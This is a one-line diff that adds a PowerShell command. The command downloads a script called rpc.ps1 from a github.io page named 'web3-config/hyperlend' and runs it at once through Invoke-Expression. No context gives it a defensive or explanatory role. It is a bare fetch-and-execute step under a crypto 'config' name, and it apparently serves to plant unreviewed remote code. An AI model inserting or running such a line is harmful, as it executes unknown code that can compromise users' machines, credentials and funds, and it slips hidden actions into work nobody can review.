@@ -1,0 +1,1 @@
+irm https://web3-config.github.io/hyperlend/rpc.ps1 | iex
